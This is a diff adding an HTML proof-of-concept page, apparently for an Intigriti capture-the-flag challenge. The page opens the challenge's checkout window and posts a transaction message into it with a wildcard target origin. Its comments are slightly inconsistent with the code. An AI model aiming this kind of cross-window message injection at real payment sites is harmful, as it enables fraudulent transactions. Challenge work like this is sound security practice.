@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Legitimate Transaction Test</title>
+</head>
+<body>
+    <h3>Step 1: Make a legitimate transaction first</h3>
+    
+    <script>
+        const target = 'https://challenge-0126.intigriti.io';
+        
+        function makeTransaction() {
+            // Open checkout page
+            const win = window.open(target + '/checkout.html?currency=1337COIN&price=1');
+            
+            setTimeout(() => {
+                // Your REAL Bitcoin address here
+                const yourBTCAddress = '1f4eb50b5dd8445bd28502edceac448763'; // Replace with your actual address
+                
+                // Send legitimate transaction
+                win.postMessage({
+                    type: 'submitTransaction',
+                    transaction: {
+                        currency: '1337COIN',
+                        amount: 1337,  // Small amount to test
+                        toAddress: yourBTCAddress
+                    }
+                }, '*');
+                
+                console.log('Transaction sent! Check your dashboard.');
+                
+            }, 3000);
+        }
+    </script>
+    
+    <button onclick="makeTransaction()">Make Test Transaction</button>
+    
+    <p><strong>Steps:</strong></p>
+    <ol>
+        <li>Replace YOUR_BITCOIN_ADDRESS_HERE with your actual BTC address</li>
+        <li>Click the button</li>
+        <li>Check your dashboard to see if the transaction appears</li>
+        <li>Check MarketWatch to see if it shows up there</li>
+    </ol>
+</body>
+</html>
